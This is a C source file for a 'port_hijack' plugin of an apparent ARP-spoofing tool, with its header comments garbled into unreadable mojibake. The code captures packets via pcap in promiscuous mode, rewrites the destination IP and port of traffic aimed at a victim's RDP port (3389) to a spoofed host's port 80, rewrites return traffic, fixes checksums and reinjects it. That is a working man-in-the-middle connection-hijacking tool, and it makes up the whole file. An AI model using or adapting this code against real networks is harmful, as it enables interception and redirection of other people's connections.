/*
�˿ڽٳ� 
���һ����ͼ���ӵ�һ��������һ���˿� �ᱻ�ٳ� ��ת��������һ������������һ���˿� 

  A -->M-->B
  ֻ��Ҫ������ƭ�����ˡ���
  ��A ��Ϊ M ��B
  
	������ǲ������߶�ʮһֻҪ�˿� Ip ������ ��ת������
	
	  ���ж�Ŀ��� ip �� �˿� �������Ҫ�� �͸�����Ϊ ����һ�� ip �Ͷ˿� ���� ����������Ǹ����� 
	  
		ò�������Ҫ���ǲ����Լ�����ȥ�İ�������
		
		  ����������ĵ��� ����ֱ��ʹ�ûص���������İ� ���� �����Լ�����һ���߳��������
		  
			A - M - B
			��
			��
			
			  �������̣�
			  ���� A������B���͡�ip����
			  ���ǶԱ��ˡ������Ķ˿ں�ip��ȷ����Ҫ���������
			  Ȼ�󽫰��ġ�Ŀ�ꡡip���ĳɡ�C����ip��������������C��������Ҫ��Ҫ���ء�C�����İ����ѡ�Դ��ַ��Ϊ��B�ġ�����أ�����
			  Ȼ��C����͡�A���������ӡ�
			  ���Ҫ�Ѱ������Լ�
			  
				�������̡߳������Լ�����ȥ�İ���
				�ػ�A�����������¡��İ���Ŀ�ꡡ��𡡸�Ϊ�Լ��ġ�Ȼ�󷢸��Լ�
				Ȼ��ػ��Լ�����ȥ�İ�����Դ���ĳ�B��ip�ٷ���ȥ������
				
				  ���ǿ��Է������Լ� Ȼ�����ϵͳ�ִ����� ���������Եģ�����
				  
					
					  ȫ�ֱ��� �� ˽�к�����ǰ׺Ϊ ph

  ������������Բ��Ǻ��ȶ� 


					  
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#ifdef WIN32
#include <windows.h>
#endif
#include <sinarp.h>

uint32 ph_hjack_ip = 0;//inet_addr("192.168.244.131");
uint32 ph_spoof_ip = 0;
uint16 ph_hjack_port = 0;  //ע��˿�Ҫת�������ֽ���� 
uint16 ph_spoof_port = 0;
uint16 ph_black_ip = 0;//һ�����ǻ�� ip 
uint32 ph_remote_ip = 0 ;//������ʹ�ñ�����ʱ�� ��סԶ���� ip 
BOOL ph_is_need_self_capture = FALSE;//�ǲ�����Ҫ�Լ����������ݰ� ��ʱ��Ҫ�Լ������� ���һ���µľ��
pcap_t *ph_pcap_handle = NULL;

/*
process_packet ������ղ��� ϵͳ�Լ�����ȥ�İ� �����õĹ����������ˡ�
*/

BOOL  process_packet(ETHeader *ethdr,uint32 len) // �����յ��� ip ��
{
	IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
	uint32 ip_len,data_len;
	uint8 *data_offset;
	uint32 pro_len;
	uint16 sport,dport;
	TCPHeader *tcphdr;
	UDPHEADER *udphdr;
	ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
	if(iphdr->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		tcphdr = (TCPHeader *) ((u_char*)iphdr + ip_len);
		pro_len = ((tcphdr->dataoffset>>4)*sizeof(unsigned long));
		sport = ntohs(tcphdr->sourcePort);
		dport = ntohs(tcphdr->destinationPort );
		
		//printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
	}
	else if(iphdr->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		//���ǲ����� UDP 
		return TRUE;//�����ϲ�ת��

		udphdr = (UDPHEADER *) ((u_char*)iphdr + ip_len);
		pro_len = ntohs(udphdr->uh_len);
		sport = ntohs(udphdr->uh_sport);
		dport = ntohs(udphdr->uh_dport);
	}
	else 
	{
		//����ʶ�Ķ���  ICMP etc.
		return TRUE;
	}
	// ���ݳ���
	data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
	// ָ�����ݵ�ָ��
	data_offset = (unsigned char *)iphdr + ip_len + pro_len;

	//sinarp_printf("%s\n","xxxx");

	if(iphdr->ipDestination == ph_hjack_ip)
	{
		//���Ǹ����� Ҫ��ƭĿ������ݰ�  ���濴���˿��ǲ���Ҫ�ٳֵĶ˿ڡ�
		if(tcphdr->destinationPort == ph_hjack_port)
		{
			//������Ҫ�޸����ݰ� ��Ŀ�� ip �� �˿� �޸ĳ� spoof ip �Ķ˿ں� ip 
			sinarp_printf("\r%s\n","hijack ----> spoof  !!!");
			iphdr->ipDestination = ph_spoof_ip;
			tcphdr->destinationPort = ph_spoof_port;
			
			if(iphdr->ipDestination == g_my_ip)
			{
				sinarp_printf("send packet to me ..\n");
				memcpy(ethdr->shost,g_my_mac,6);
				memcpy(ethdr->dhost,g_my_gw_mac,6); //���͸����� Ȼ���ٷ������������
				iphdr->ipSource = ph_black_ip; //��Ϊ��Ч�� ip 
				sinarp_checksum(iphdr);
				//���������Լ� 
				if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
				{
					printf("\r[!] port_hijack: send packet failed !\r\n");
				}
				return FALSE;
			}
			sinarp_checksum(iphdr);
		}
	}
	else if(iphdr->ipSource == ph_spoof_ip)
	{
		if(tcphdr->sourcePort == ph_spoof_port)
		{
			//������Ҫ�޸�Դ ip �� �˿�Ϊ hijack �� ip �� ��

			if(iphdr->ipSource == g_my_ip)
			{
				sinarp_printf("\r%s\n","spoof ----> hijack  !!!");
				iphdr->ipSource = ph_hjack_ip;
				tcphdr->sourcePort = ph_hjack_port;

				sinarp_checksum(iphdr);
				sinarp_forward_fix_packet(ethdr);
				if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
				{
					printf("\r[!] port_hijack: send packet failed !\r\n");
				}
				return FALSE;
			}

			sinarp_printf("\r%s\n","spoof ----> hijack  !!!");
			iphdr->ipSource = ph_hjack_ip;
			tcphdr->sourcePort = ph_hjack_port;
			sinarp_checksum(iphdr);
		}
	}
/*	else if(iphdr->ipSource == ph_hjack_ip)
	{
		if (tcphdr->sourcePort == ph_hjack_port)
		{
			sinarp_printf("%s","\rtry block ...\n");
			return FALSE;// ���������İ�����
		}
	}
	*/
	return TRUE;
}


void   ph_packet_handler(u_char *param, const struct pcap_pkthdr *header, 
						 const u_char *pkt_data)
{
    ETHeader *eh;
    IPHeader *ih;
    ARPHeader *arp_hdr;
    BOOL bRet = FALSE;
    u_int ip_len=0, pro_len=0, data_len=0;
    u_int pkt_len = header->len;
    uint32 idx = 0;
    eh = (ETHeader *) pkt_data;
    if(pkt_len < 14)
        return; 
	
	//ת�� ip ���ݰ�����
	if(eh->type != htons(ETHERTYPE_IP))
		return; // ֻת��IP��
	
	// �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
	ih = (IPHeader *) ((u_char*)eh + 14); //14Ϊ��̫ͷ�ĳ���
	
	sinarp_printf("\rrecv one \n");
	process_packet(eh,pkt_len);

	return;
}


void * ph_capture(void *x)
{
    int ret;

    while(!g_is_time_shutdown)//�� sinarp �������
    {
        ret = pf_pcap_loop(ph_pcap_handle, 1, (pcap_handler)ph_packet_handler,NULL);
        if(ret == 0)
        {
            continue;
        }
        else
        {
            //pf_pcap_perror(g_adhandle,"break");
            break;
        }
    }
}

BOOL plugin_init()
{
	char errbuf[PCAP_ERRBUF_SIZE];
	char sniffer_filter[256];
	struct bpf_program fcode;

	ph_hjack_ip = inet_addr("192.168.244.122");
	ph_spoof_ip = inet_addr("192.168.244.128");
	ph_black_ip = inet_addr("192.168.244.244");
	ph_hjack_port = htons(3389);
	ph_spoof_port = htons(80);

	if(ph_spoof_ip == g_my_ip)
	{
		ph_is_need_self_capture = TRUE;
		if((ph_pcap_handle = pf_pcap_open_live(g_opened_if_name, // device 
			65536,     // portion of the packet to capture.
			// 65536 grants that the whole packet will be captured on all the MACs.
			1,       // promiscuous mode 
			1, //a value of 0 means no time out
			errbuf     // error buffer
			)) == NULL)
		{
			sinarp_printf("failed open %s \n",g_opened_if_name);
			return FALSE;
        }
		
		//ֻ���������Լ�����ȥ�İ�
		sprintf(sniffer_filter,"tcp src port %u",htons(ph_spoof_port));

		sinarp_printf("filter: %s \n",sniffer_filter);

		if (pf_pcap_compile(ph_pcap_handle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
		{
			sinarp_printf("%s","\nUnable to compile the packet filter\n");
			/* Free the device list */
			goto clean;
		}
		//���ù�����
		if (pf_pcap_setfilter(ph_pcap_handle, &fcode) < 0)
		{
			sinarp_printf("%s","\nError setting the filter.\n");
			/* Free the device list */
			goto clean;
		}
		sinarp_printf("\rport_hijack start capture thread \n");
		sinarp_create_thread(ph_capture,NULL);
    }
	else
	{
		ph_is_need_self_capture = FALSE;
	}

	return TRUE;
clean:
	pf_pcap_close(ph_pcap_handle);
	return FALSE;
}

void * plugin_unload()
{
	if(ph_is_need_self_capture)
	{
		pf_pcap_breakloop(ph_pcap_handle);
		//Sleep(1000);
		pf_pcap_close(ph_pcap_handle);
	}
}

/*
BOOL __stdcall DllMain( HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved )
{
switch(dwReason)
{
case DLL_PROCESS_ATTACH:
{

		}
		break;
		case DLL_PROCESS_DETACH:
		{
		
		  }
		  break;
		  default:
		  break;
		  }
		  return TRUE;
		  }
*/